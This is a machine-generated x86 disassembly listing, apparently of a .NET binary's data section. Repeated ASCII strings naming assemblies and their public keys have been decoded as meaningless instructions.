  4051b1:	xor    DWORD PTR [ebx+0x38],esp
  4051b4:	popa   
  4051b5:	xor    DWORD PTR [edx],esi
  4051b7:	xor    al,0x33
  4051b9:	ss xor eax,0x30323831
  4051bf:	ss arpl WORD PTR fs:[eax],si
  4051c3:	cmp    DWORD PTR [ebx],esi
  4051c5:	xor    esi,DWORD PTR [esp+esi*1]
  4051c8:	fs xor eax,0x39326461
  4051ce:	xor    eax,DWORD PTR [eax]
  4051d0:	add    BYTE PTR [ecx-0x7efffe83],al
  4051d6:	ja     0x405225
  4051d8:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4051df:	je     0x40520f
  4051e1:	push   esi
  4051e2:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4051e9:	jne    0x40524f
  4051eb:	imul   ebp,DWORD PTR [edi+0x2e],0x63617254
  4051f2:	gs inc ebx
  4051f4:	outs   dx,DWORD PTR ds:[esi]
  4051f5:	ins    BYTE PTR es:[edi],dx
  4051f6:	ins    BYTE PTR es:[edi],dx
  4051f7:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4051fc:	cs push esp
  4051fe:	gs jae 0x405275
  405201:	jae    0x40522f
  405203:	and    BYTE PTR [eax+0x75],dl
  405206:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40520a:	dec    ebx
  40520b:	gs jns 0x40524b
  40520e:	xor    BYTE PTR [eax],dh
  405210:	xor    dh,BYTE PTR [eax+esi*1]
  405213:	xor    BYTE PTR [eax],dh
  405215:	xor    BYTE PTR [eax],dh
  405217:	xor    al,0x38
  405219:	xor    BYTE PTR [eax],dh
  40521b:	xor    BYTE PTR [eax],dh
  40521d:	xor    BYTE PTR [ecx],bh
  40521f:	xor    al,0x30
  405221:	xor    BYTE PTR [eax],dh
  405223:	xor    BYTE PTR [eax],dh
  405225:	xor    BYTE PTR [eax],dh
  405227:	xor    BYTE PTR ss:[edx],dh
  40522a:	xor    BYTE PTR [eax],dh
  40522c:	xor    BYTE PTR [eax],dh
  40522e:	xor    BYTE PTR [eax],dh
  405230:	xor    dh,BYTE PTR [eax+esi*1]
  405233:	xor    BYTE PTR [eax],dh
  405235:	xor    BYTE PTR ds:0x34333532,dh
  40523b:	xor    DWORD PTR [ebx],esi
  40523d:	xor    DWORD PTR [eax],esi
  40523f:	xor    BYTE PTR [eax],dh
  405241:	xor    al,0x30
  405243:	xor    BYTE PTR [eax],dh
  405245:	xor    BYTE PTR [eax],dh
  405247:	xor    DWORD PTR [eax],esi
  405249:	xor    BYTE PTR [eax],dh
  40524b:	xor    DWORD PTR [eax],esi
  40524d:	xor    BYTE PTR [eax],dh
  40524f:	aaa    
  405250:	xor    DWORD PTR fs:[esi+0x61],esp
  405254:	xor    eax,0x61346337
  405259:	gs cmp DWORD PTR fs:[esi+0x30],esp
  40525e:	popa   
  40525f:	xor    esi,DWORD PTR [edx]
  405261:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405265:	popa   
  405266:	xor    BYTE PTR [esi+0x61],ah
  405269:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  405270:	cmp    BYTE PTR gs:[esi+0x64],ah
  405274:	ss popa 
  405276:	arpl   WORD PTR gs:[eax],di
  405279:	data16 cmp BYTE PTR [edi],dh
  40527c:	bound  si,DWORD PTR [eax]
  40527f:	xor    esi,DWORD PTR [edi]
  405281:	ss arpl WORD PTR ss:[eax],di
  405285:	xor    esi,DWORD PTR [ebx+eiz*2]
  405288:	cmp    DWORD PTR [ecx],edi
  40528a:	cmp    DWORD PTR [edx],esi
  40528c:	xor    DWORD PTR [ebp+0x62],esp
  40528f:	xor    dh,BYTE PTR [ebx]
  405291:	bound  esp,QWORD PTR [ebp+0x37]
  405294:	cmp    DWORD PTR [ecx+0x64],esp
  405297:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  40529b:	arpl   WORD PTR [ebx+0x31],sp
  40529e:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4052a3:	xor    dh,BYTE PTR [ebx]
  4052a5:	xor    DWORD PTR ss:[ebx],esi
  4052a8:	xor    dh,BYTE PTR [ecx]
  4052aa:	xor    BYTE PTR [edx],dh
  4052ac:	cmp    DWORD PTR [eax],esi
  4052ae:	xor    BYTE PTR [edx+0x37],ah
  4052b1:	xor    dh,BYTE PTR [ebx]
  4052b3:	arpl   WORD PTR [esi+0x39],sp
  4052b6:	cmp    BYTE PTR [eax],dh
  4052b8:	cmp    DWORD PTR ds:0x34636637,esi
  4052be:	xor    DWORD PTR gs:[edi],esi
  4052c1:	aaa    
  4052c2:	xor    DWORD PTR [eax],esi
  4052c4:	cmp    BYTE PTR [esi+0x63],ah
  4052c7:	xor    BYTE PTR ss:[edi],dh
  4052ca:	aaa    
  4052cb:	aaa    
  4052cc:	xor    al,0x66
  4052ce:	xor    bh,BYTE PTR [ecx]
  4052d0:	cmp    BYTE PTR gs:[ebx],dh
  4052d3:	xor    dh,BYTE PTR [eax]
  4052d5:	cmp    DWORD PTR gs:[edx],esi
  4052d8:	gs popa 
  4052da:	xor    BYTE PTR ds:0x34656365,dh
  4052e0:	cmp    BYTE PTR gs:[edx],dh
  4052e3:	xor    DWORD PTR [ebx+0x30],esp
  4052e6:	popa   
  4052e7:	xor    eax,0x38656665
  4052ec:	xor    WORD PTR [esi],si
  4052ef:	xor    al,0x35
  4052f1:	arpl   WORD PTR [ebx+eiz*2],si
  4052f4:	xor    BYTE PTR [ebx+0x39],ah
  4052f7:	xor    esp,DWORD PTR [ebx+0x31]
  4052fa:	popa   
  4052fb:	bound  edi,QWORD PTR [ecx]
  4052fd:	cmp    DWORD PTR [edx],esi
  4052ff:	cmp    BYTE PTR ds:0x32323664,dh
  405305:	arpl   WORD PTR [ecx+0x61],sp
  405308:	ss xor eax,0x64316332
  40530e:	popaw  
  405310:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405316:	xor    eax,0x32663664
  40531b:	fs gs xor eax,0x65373166
  405322:	xor    eax,0x30666165
  405327:	data16 arpl WORD PTR [ecx+edi*1],si
  40532b:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405330:	xor    DWORD PTR [ebx+0x38],esp
  405333:	popa   
  405334:	xor    DWORD PTR [edx],esi
  405336:	xor    al,0x33
  405338:	ss xor eax,0x30323831
  40533e:	ss arpl WORD PTR fs:[eax],si
  405342:	cmp    DWORD PTR [ebx],esi
  405344:	xor    esi,DWORD PTR [esp+esi*1]
  405347:	fs xor eax,0x39326461
  40534d:	xor    eax,DWORD PTR [eax]
  40534f:	add    BYTE PTR [ecx-0x7efffea2],al
  405355:	pop    eax
  405356:	push   esp
  405357:	inc    esp
  405358:	inc    ebp
  405359:	outs   dx,BYTE PTR ds:[esi]
  40535a:	jbe    0x40539f
  40535c:	ins    BYTE PTR es:[edi],dx
  40535d:	gs popa 
  40535f:	outs   dx,BYTE PTR ds:[esi]
  405360:	jne    0x4053d2
  405362:	sub    al,0x20
  405364:	push   eax
  405365:	jne    0x4053c9
  405367:	ins    BYTE PTR es:[edi],dx
  405368:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  40536f:	xor    BYTE PTR [edx],dh
  405371:	xor    al,0x30
  405373:	xor    BYTE PTR [eax],dh
  405375:	xor    BYTE PTR [eax],dh
  405377:	xor    al,0x38
  405379:	xor    BYTE PTR [eax],dh
  40537b:	xor    BYTE PTR [eax],dh
  40537d:	xor    BYTE PTR [ecx],bh
  40537f:	xor    al,0x30
  405381:	xor    BYTE PTR [eax],dh
  405383:	xor    BYTE PTR [eax],dh
  405385:	xor    BYTE PTR [eax],dh
  405387:	xor    BYTE PTR ss:[edx],dh
  40538a:	xor    BYTE PTR [eax],dh
  40538c:	xor    BYTE PTR [eax],dh
  40538e:	xor    BYTE PTR [eax],dh
  405390:	xor    dh,BYTE PTR [eax+esi*1]
  405393:	xor    BYTE PTR [eax],dh
  405395:	xor    BYTE PTR ds:0x34333532,dh
  40539b:	xor    DWORD PTR [ebx],esi
  40539d:	xor    DWORD PTR [eax],esi
  40539f:	xor    BYTE PTR [eax],dh
  4053a1:	xor    al,0x30
  4053a3:	xor    BYTE PTR [eax],dh
  4053a5:	xor    BYTE PTR [eax],dh
  4053a7:	xor    DWORD PTR [eax],esi
  4053a9:	xor    BYTE PTR [eax],dh
  4053ab:	xor    DWORD PTR [eax],esi
  4053ad:	xor    BYTE PTR [eax],dh
  4053af:	aaa    
  4053b0:	xor    DWORD PTR fs:[esi+0x61],esp
  4053b4:	xor    eax,0x61346337
  4053b9:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4053be:	popa   
  4053bf:	xor    esi,DWORD PTR [edx]
  4053c1:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4053c5:	popa   
  4053c6:	xor    BYTE PTR [esi+0x61],ah
  4053c9:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4053d0:	cmp    BYTE PTR gs:[esi+0x64],ah
  4053d4:	ss popa 
  4053d6:	arpl   WORD PTR gs:[eax],di
  4053d9:	data16 cmp BYTE PTR [edi],dh
  4053dc:	bound  si,DWORD PTR [eax]
  4053df:	xor    esi,DWORD PTR [edi]
  4053e1:	ss arpl WORD PTR ss:[eax],di
  4053e5:	xor    esi,DWORD PTR [ebx+eiz*2]
  4053e8:	cmp    DWORD PTR [ecx],edi
  4053ea:	cmp    DWORD PTR [edx],esi
  4053ec:	xor    DWORD PTR [ebp+0x62],esp
  4053ef:	xor    dh,BYTE PTR [ebx]
  4053f1:	bound  esp,QWORD PTR [ebp+0x37]
  4053f4:	cmp    DWORD PTR [ecx+0x64],esp
  4053f7:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4053fb:	arpl   WORD PTR [ebx+0x31],sp
  4053fe:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405403:	xor    dh,BYTE PTR [ebx]
  405405:	xor    DWORD PTR ss:[ebx],esi
  405408:	xor    dh,BYTE PTR [ecx]
  40540a:	xor    BYTE PTR [edx],dh
  40540c:	cmp    DWORD PTR [eax],esi
  40540e:	xor    BYTE PTR [edx+0x37],ah
  405411:	xor    dh,BYTE PTR [ebx]
  405413:	arpl   WORD PTR [esi+0x39],sp
  405416:	cmp    BYTE PTR [eax],dh
  405418:	cmp    DWORD PTR ds:0x34636637,esi
  40541e:	xor    DWORD PTR gs:[edi],esi
  405421:	aaa    
  405422:	xor    DWORD PTR [eax],esi
  405424:	cmp    BYTE PTR [esi+0x63],ah
  405427:	xor    BYTE PTR ss:[edi],dh
  40542a:	aaa    
  40542b:	aaa    
  40542c:	xor    al,0x66
  40542e:	xor    bh,BYTE PTR [ecx]
  405430:	cmp    BYTE PTR gs:[ebx],dh
  405433:	xor    dh,BYTE PTR [eax]
  405435:	cmp    DWORD PTR gs:[edx],esi
  405438:	gs popa 
  40543a:	xor    BYTE PTR ds:0x34656365,dh
  405440:	cmp    BYTE PTR gs:[edx],dh
  405443:	xor    DWORD PTR [ebx+0x30],esp
  405446:	popa   
  405447:	xor    eax,0x38656665
  40544c:	xor    WORD PTR [esi],si
  40544f:	xor    al,0x35
  405451:	arpl   WORD PTR [ebx+eiz*2],si
  405454:	xor    BYTE PTR [ebx+0x39],ah
  405457:	xor    esp,DWORD PTR [ebx+0x31]
  40545a:	popa   
  40545b:	bound  edi,QWORD PTR [ecx]
  40545d:	cmp    DWORD PTR [edx],esi
  40545f:	cmp    BYTE PTR ds:0x32323664,dh
  405465:	arpl   WORD PTR [ecx+0x61],sp
  405468:	ss xor eax,0x64316332
  40546e:	popaw  
  405470:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405476:	xor    eax,0x32663664
  40547b:	fs gs xor eax,0x65373166
  405482:	xor    eax,0x30666165
  405487:	data16 arpl WORD PTR [ecx+edi*1],si
  40548b:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405490:	xor    DWORD PTR [ebx+0x38],esp
  405493:	popa   
  405494:	xor    DWORD PTR [edx],esi
  405496:	xor    al,0x33
  405498:	ss xor eax,0x30323831
  40549e:	ss arpl WORD PTR fs:[eax],si
  4054a2:	cmp    DWORD PTR [ebx],esi
  4054a4:	xor    esi,DWORD PTR [esp+esi*1]
  4054a7:	fs xor eax,0x39326461
  4054ad:	xor    eax,DWORD PTR [eax]
  4054af:	add    BYTE PTR [ecx-0x7efffe88],al
  4054b5:	jb     0x405504
  4054b7:	push   ebx
  4054b8:	push   esp
  4054b9:	gs jae 0x405530
  4054bc:	cs push esi
  4054be:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4054c5:	jne    0x40552b
  4054c7:	imul   ebp,DWORD PTR [edi+0x2e],0x6e495454
  4054ce:	je     0x405535
  4054d0:	addr16 jb 0x405534
  4054d3:	je     0x40553e
  4054d5:	outs   dx,DWORD PTR ds:[esi]
  4054d6:	outs   dx,BYTE PTR ds:[esi]
  4054d7:	cs push esp
  4054d9:	gs jae 0x405550
  4054dc:	sub    al,0x20
  4054de:	push   eax
  4054df:	jne    0x405543
  4054e1:	ins    BYTE PTR es:[edi],dx
  4054e2:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4054e9:	xor    BYTE PTR [edx],dh
  4054eb:	xor    al,0x30
  4054ed:	xor    BYTE PTR [eax],dh
  4054ef:	xor    BYTE PTR [eax],dh
  4054f1:	xor    al,0x38
  4054f3:	xor    BYTE PTR [eax],dh
  4054f5:	xor    BYTE PTR [eax],dh
  4054f7:	xor    BYTE PTR [ecx],bh
  4054f9:	xor    al,0x30
  4054fb:	xor    BYTE PTR [eax],dh
  4054fd:	xor    BYTE PTR [eax],dh
  4054ff:	xor    BYTE PTR [eax],dh
  405501:	xor    BYTE PTR ss:[edx],dh
  405504:	xor    BYTE PTR [eax],dh
  405506:	xor    BYTE PTR [eax],dh
  405508:	xor    BYTE PTR [eax],dh
  40550a:	xor    dh,BYTE PTR [eax+esi*1]
  40550d:	xor    BYTE PTR [eax],dh
  40550f:	xor    BYTE PTR ds:0x34333532,dh
  405515:	xor    DWORD PTR [ebx],esi
  405517:	xor    DWORD PTR [eax],esi
  405519:	xor    BYTE PTR [eax],dh
  40551b:	xor    al,0x30
  40551d:	xor    BYTE PTR [eax],dh
  40551f:	xor    BYTE PTR [eax],dh
  405521:	xor    DWORD PTR [eax],esi
  405523:	xor    BYTE PTR [eax],dh
  405525:	xor    DWORD PTR [eax],esi
  405527:	xor    BYTE PTR [eax],dh
  405529:	aaa    
  40552a:	xor    DWORD PTR fs:[esi+0x61],esp
  40552e:	xor    eax,0x61346337
  405533:	gs cmp DWORD PTR fs:[esi+0x30],esp
  405538:	popa   
  405539:	xor    esi,DWORD PTR [edx]
  40553b:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  40553f:	popa   
  405540:	xor    BYTE PTR [esi+0x61],ah
  405543:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40554a:	cmp    BYTE PTR gs:[esi+0x64],ah
  40554e:	ss popa 
  405550:	arpl   WORD PTR gs:[eax],di
  405553:	data16 cmp BYTE PTR [edi],dh
  405556:	bound  si,DWORD PTR [eax]
  405559:	xor    esi,DWORD PTR [edi]
  40555b:	ss arpl WORD PTR ss:[eax],di
  40555f:	xor    esi,DWORD PTR [ebx+eiz*2]
  405562:	cmp    DWORD PTR [ecx],edi
  405564:	cmp    DWORD PTR [edx],esi
  405566:	xor    DWORD PTR [ebp+0x62],esp
  405569:	xor    dh,BYTE PTR [ebx]
  40556b:	bound  esp,QWORD PTR [ebp+0x37]
  40556e:	cmp    DWORD PTR [ecx+0x64],esp
  405571:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405575:	arpl   WORD PTR [ebx+0x31],sp
  405578:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40557d:	xor    dh,BYTE PTR [ebx]
  40557f:	xor    DWORD PTR ss:[ebx],esi
  405582:	xor    dh,BYTE PTR [ecx]
  405584:	xor    BYTE PTR [edx],dh
  405586:	cmp    DWORD PTR [eax],esi
  405588:	xor    BYTE PTR [edx+0x37],ah
  40558b:	xor    dh,BYTE PTR [ebx]
  40558d:	arpl   WORD PTR [esi+0x39],sp
  405590:	cmp    BYTE PTR [eax],dh
  405592:	cmp    DWORD PTR ds:0x34636637,esi
  405598:	xor    DWORD PTR gs:[edi],esi
  40559b:	aaa    
  40559c:	xor    DWORD PTR [eax],esi
  40559e:	cmp    BYTE PTR [esi+0x63],ah
  4055a1:	xor    BYTE PTR ss:[edi],dh
  4055a4:	aaa    
  4055a5:	aaa    
  4055a6:	xor    al,0x66
  4055a8:	xor    bh,BYTE PTR [ecx]
  4055aa:	cmp    BYTE PTR gs:[ebx],dh
  4055ad:	xor    dh,BYTE PTR [eax]
  4055af:	cmp    DWORD PTR gs:[edx],esi
  4055b2:	gs popa 
  4055b4:	xor    BYTE PTR ds:0x34656365,dh
  4055ba:	cmp    BYTE PTR gs:[edx],dh
  4055bd:	xor    DWORD PTR [ebx+0x30],esp
  4055c0:	popa   
  4055c1:	xor    eax,0x38656665
  4055c6:	xor    WORD PTR [esi],si
  4055c9:	xor    al,0x35
  4055cb:	arpl   WORD PTR [ebx+eiz*2],si
  4055ce:	xor    BYTE PTR [ebx+0x39],ah
  4055d1:	xor    esp,DWORD PTR [ebx+0x31]
  4055d4:	popa   
  4055d5:	bound  edi,QWORD PTR [ecx]
  4055d7:	cmp    DWORD PTR [edx],esi
  4055d9:	cmp    BYTE PTR ds:0x32323664,dh
  4055df:	arpl   WORD PTR [ecx+0x61],sp
  4055e2:	ss xor eax,0x64316332
  4055e8:	popaw  
  4055ea:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4055f0:	xor    eax,0x32663664
  4055f5:	fs gs xor eax,0x65373166
  4055fc:	xor    eax,0x30666165
  405601:	data16 arpl WORD PTR [ecx+edi*1],si
  405605:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  40560a:	xor    DWORD PTR [ebx+0x38],esp
  40560d:	popa   
  40560e:	xor    DWORD PTR [edx],esi
  405610:	xor    al,0x33
  405612:	ss xor eax,0x30323831
  405618:	ss arpl WORD PTR fs:[eax],si
  40561c:	cmp    DWORD PTR [ebx],esi
  40561e:	xor    esi,DWORD PTR [esp+esi*1]
  405621:	fs xor eax,0x39326461
  405627:	xor    eax,DWORD PTR [eax]
  405629:	add    BYTE PTR [ecx-0x7efffe9c],al
  40562f:	pop    esi
  405630:	fs gs ins BYTE PTR es:[edi],dx
  405633:	je     0x405696
  405635:	cs push esp
  405637:	jb     0x40569a
  405639:	arpl   WORD PTR [ebp+0x50],sp
  40563c:	popa   
  40563d:	arpl   WORD PTR [ebx+0x61],bp
  405640:	addr16 gs sub al,0x20
  405644:	push   eax
  405645:	jne    0x4056a9
  405647:	ins    BYTE PTR es:[edi],dx
  405648:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  40564f:	xor    BYTE PTR [edx],dh
  405651:	xor    al,0x30
  405653:	xor    BYTE PTR [eax],dh
  405655:	xor    BYTE PTR [eax],dh
  405657:	xor    al,0x38
  405659:	xor    BYTE PTR [eax],dh
  40565b:	xor    BYTE PTR [eax],dh
  40565d:	xor    BYTE PTR [ecx],bh
  40565f:	xor    al,0x30
  405661:	xor    BYTE PTR [eax],dh
  405663:	xor    BYTE PTR [eax],dh
  405665:	xor    BYTE PTR [eax],dh
  405667:	xor    BYTE PTR ss:[edx],dh
  40566a:	xor    BYTE PTR [eax],dh
  40566c:	xor    BYTE PTR [eax],dh
  40566e:	xor    BYTE PTR [eax],dh
  405670:	xor    dh,BYTE PTR [eax+esi*1]
  405673:	xor    BYTE PTR [eax],dh
  405675:	xor    BYTE PTR ds:0x34333532,dh
  40567b:	xor    DWORD PTR [ebx],esi
  40567d:	xor    DWORD PTR [eax],esi
  40567f:	xor    BYTE PTR [eax],dh
  405681:	xor    al,0x30
  405683:	xor    BYTE PTR [eax],dh
  405685:	xor    BYTE PTR [eax],dh
  405687:	xor    DWORD PTR [eax],esi
  405689:	xor    BYTE PTR [eax],dh
  40568b:	xor    DWORD PTR [eax],esi
  40568d:	xor    BYTE PTR [eax],dh
  40568f:	aaa    
  405690:	xor    DWORD PTR fs:[esi+0x61],esp
  405694:	xor    eax,0x61346337
  405699:	gs cmp DWORD PTR fs:[esi+0x30],esp
  40569e:	popa   
  40569f:	xor    esi,DWORD PTR [edx]
  4056a1:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4056a5:	popa   
  4056a6:	xor    BYTE PTR [esi+0x61],ah
  4056a9:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4056b0:	cmp    BYTE PTR gs:[esi+0x64],ah
  4056b4:	ss popa 
  4056b6:	arpl   WORD PTR gs:[eax],di
  4056b9:	data16 cmp BYTE PTR [edi],dh
  4056bc:	bound  si,DWORD PTR [eax]
  4056bf:	xor    esi,DWORD PTR [edi]
  4056c1:	ss arpl WORD PTR ss:[eax],di
  4056c5:	xor    esi,DWORD PTR [ebx+eiz*2]
  4056c8:	cmp    DWORD PTR [ecx],edi
  4056ca:	cmp    DWORD PTR [edx],esi
  4056cc:	xor    DWORD PTR [ebp+0x62],esp
  4056cf:	xor    dh,BYTE PTR [ebx]
  4056d1:	bound  esp,QWORD PTR [ebp+0x37]
  4056d4:	cmp    DWORD PTR [ecx+0x64],esp
  4056d7:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4056db:	arpl   WORD PTR [ebx+0x31],sp
  4056de:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4056e3:	xor    dh,BYTE PTR [ebx]
  4056e5:	xor    DWORD PTR ss:[ebx],esi
  4056e8:	xor    dh,BYTE PTR [ecx]
  4056ea:	xor    BYTE PTR [edx],dh
  4056ec:	cmp    DWORD PTR [eax],esi
  4056ee:	xor    BYTE PTR [edx+0x37],ah
  4056f1:	xor    dh,BYTE PTR [ebx]
  4056f3:	arpl   WORD PTR [esi+0x39],sp
  4056f6:	cmp    BYTE PTR [eax],dh
  4056f8:	cmp    DWORD PTR ds:0x34636637,esi
  4056fe:	xor    DWORD PTR gs:[edi],esi
  405701:	aaa    
  405702:	xor    DWORD PTR [eax],esi
  405704:	cmp    BYTE PTR [esi+0x63],ah
  405707:	xor    BYTE PTR ss:[edi],dh
  40570a:	aaa    
  40570b:	aaa    
  40570c:	xor    al,0x66
  40570e:	xor    bh,BYTE PTR [ecx]
  405710:	cmp    BYTE PTR gs:[ebx],dh
  405713:	xor    dh,BYTE PTR [eax]
  405715:	cmp    DWORD PTR gs:[edx],esi
  405718:	gs popa 
  40571a:	xor    BYTE PTR ds:0x34656365,dh
  405720:	cmp    BYTE PTR gs:[edx],dh
  405723:	xor    DWORD PTR [ebx+0x30],esp
  405726:	popa   
  405727:	xor    eax,0x38656665
  40572c:	xor    WORD PTR [esi],si
  40572f:	xor    al,0x35
  405731:	arpl   WORD PTR [ebx+eiz*2],si
  405734:	xor    BYTE PTR [ebx+0x39],ah
  405737:	xor    esp,DWORD PTR [ebx+0x31]
  40573a:	popa   
  40573b:	bound  edi,QWORD PTR [ecx]
  40573d:	cmp    DWORD PTR [edx],esi
  40573f:	cmp    BYTE PTR ds:0x32323664,dh
  405745:	arpl   WORD PTR [ecx+0x61],sp
  405748:	ss xor eax,0x64316332
  40574e:	popaw  
  405750:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  405756:	xor    eax,0x32663664
  40575b:	fs gs xor eax,0x65373166
  405762:	xor    eax,0x30666165
  405767:	data16 arpl WORD PTR [ecx+edi*1],si
  40576b:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  405770:	xor    DWORD PTR [ebx+0x38],esp
  405773:	popa   
  405774:	xor    DWORD PTR [edx],esi
  405776:	xor    al,0x33
  405778:	ss xor eax,0x30323831
  40577e:	ss arpl WORD PTR fs:[eax],si
  405782:	cmp    DWORD PTR [ebx],esi
  405784:	xor    esi,DWORD PTR [esp+esi*1]
  405787:	fs xor eax,0x39326461
  40578d:	xor    eax,DWORD PTR [eax]
  40578f:	add    BYTE PTR [ecx-0x7efffea5],al
  405795:	push   ebp
  405796:	push   esp
  405797:	inc    esp
  405798:	dec    esp
  405799:	outs   dx,DWORD PTR ds:[esi]
  40579a:	addr16 inc esp
  40579c:	jne    0x40580b
  40579e:	jo     0x4057cc
  4057a0:	and    BYTE PTR [eax+0x75],dl
  4057a3:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4057a7:	dec    ebx
  4057a8:	gs jns 0x4057e8
  4057ab:	xor    BYTE PTR [eax],dh
  4057ad:	xor    dh,BYTE PTR [eax+esi*1]
  4057b0:	xor    BYTE PTR [eax],dh
  4057b2:	xor    BYTE PTR [eax],dh
  4057b4:	xor    al,0x38
  4057b6:	xor    BYTE PTR [eax],dh
  4057b8:	xor    BYTE PTR [eax],dh
  4057ba:	xor    BYTE PTR [ecx],bh
  4057bc:	xor    al,0x30
  4057be:	xor    BYTE PTR [eax],dh
  4057c0:	xor    BYTE PTR [eax],dh
  4057c2:	xor    BYTE PTR [eax],dh
  4057c4:	xor    BYTE PTR ss:[edx],dh
  4057c7:	xor    BYTE PTR [eax],dh
  4057c9:	xor    BYTE PTR [eax],dh
  4057cb:	xor    BYTE PTR [eax],dh
  4057cd:	xor    dh,BYTE PTR [eax+esi*1]
  4057d0:	xor    BYTE PTR [eax],dh
  4057d2:	xor    BYTE PTR ds:0x34333532,dh
  4057d8:	xor    DWORD PTR [ebx],esi
  4057da:	xor    DWORD PTR [eax],esi
  4057dc:	xor    BYTE PTR [eax],dh
  4057de:	xor    al,0x30
  4057e0:	xor    BYTE PTR [eax],dh
  4057e2:	xor    BYTE PTR [eax],dh
  4057e4:	xor    DWORD PTR [eax],esi
  4057e6:	xor    BYTE PTR [eax],dh
  4057e8:	xor    DWORD PTR [eax],esi
  4057ea:	xor    BYTE PTR [eax],dh
  4057ec:	aaa    
  4057ed:	xor    DWORD PTR fs:[esi+0x61],esp
  4057f1:	xor    eax,0x61346337
  4057f6:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4057fb:	popa   
  4057fc:	xor    esi,DWORD PTR [edx]
  4057fe:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  405802:	popa   
  405803:	xor    BYTE PTR [esi+0x61],ah
  405806:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40580d:	cmp    BYTE PTR gs:[esi+0x64],ah
  405811:	ss popa 
  405813:	arpl   WORD PTR gs:[eax],di
  405816:	data16 cmp BYTE PTR [edi],dh
  405819:	bound  si,DWORD PTR [eax]
  40581c:	xor    esi,DWORD PTR [edi]
  40581e:	ss arpl WORD PTR ss:[eax],di
  405822:	xor    esi,DWORD PTR [ebx+eiz*2]
  405825:	cmp    DWORD PTR [ecx],edi
  405827:	cmp    DWORD PTR [edx],esi
  405829:	xor    DWORD PTR [ebp+0x62],esp
  40582c:	xor    dh,BYTE PTR [ebx]
  40582e:	bound  esp,QWORD PTR [ebp+0x37]
  405831:	cmp    DWORD PTR [ecx+0x64],esp
  405834:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  405838:	arpl   WORD PTR [ebx+0x31],sp
  40583b:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  405840:	xor    dh,BYTE PTR [ebx]
  405842:	xor    DWORD PTR ss:[ebx],esi
  405845:	xor    dh,BYTE PTR [ecx]
  405847:	xor    BYTE PTR [edx],dh
  405849:	cmp    DWORD PTR [eax],esi
  40584b:	xor    BYTE PTR [edx+0x37],ah
  40584e:	xor    dh,BYTE PTR [ebx]
  405850:	arpl   WORD PTR [esi+0x39],sp
  405853:	cmp    BYTE PTR [eax],dh
  405855:	cmp    DWORD PTR ds:0x34636637,esi
  40585b:	xor    DWORD PTR gs:[edi],esi
  40585e:	aaa    
  40585f:	xor    DWORD PTR [eax],esi
  405861:	cmp    BYTE PTR [esi+0x63],ah
  405864:	xor    BYTE PTR ss:[edi],dh
  405867:	aaa    
  405868:	aaa    
  405869:	xor    al,0x66
  40586b:	xor    bh,BYTE PTR [ecx]
  40586d:	cmp    BYTE PTR gs:[ebx],dh
  405870:	xor    dh,BYTE PTR [eax]
  405872:	cmp    DWORD PTR gs:[edx],esi
  405875:	gs popa 
  405877:	xor    BYTE PTR ds:0x34656365,dh
  40587d:	cmp    BYTE PTR gs:[edx],dh
  405880:	xor    DWORD PTR [ebx+0x30],esp
  405883:	popa   
  405884:	xor    eax,0x38656665
  405889:	xor    WORD PTR [esi],si
  40588c:	xor    al,0x35
  40588e:	arpl   WORD PTR [ebx+eiz*2],si
  405891:	xor    BYTE PTR [ebx+0x39],ah
  405894:	xor    esp,DWORD PTR [ebx+0x31]
  405897:	popa   
  405898:	bound  edi,QWORD PTR [ecx]
  40589a:	cmp    DWORD PTR [edx],esi
  40589c:	cmp    BYTE PTR ds:0x32323664,dh
  4058a2:	arpl   WORD PTR [ecx+0x61],sp
  4058a5:	ss xor eax,0x64316332
  4058ab:	popaw  
  4058ad:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4058b3:	xor    eax,0x32663664
  4058b8:	fs gs xor eax,0x65373166
  4058bf:	xor    eax,0x30666165
  4058c4:	data16 arpl WORD PTR [ecx+edi*1],si
  4058c8:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4058cd:	xor    DWORD PTR [ebx+0x38],esp
  4058d0:	popa   
  4058d1:	xor    DWORD PTR [edx],esi
  4058d3:	xor    al,0x33
  4058d5:	ss xor eax,0x30323831
  4058db:	ss arpl WORD PTR fs:[eax],si
  4058df:	cmp    DWORD PTR [ebx],esi
  4058e1:	xor    esi,DWORD PTR [esp+esi*1]
  4058e4:	fs xor eax,0x39326461
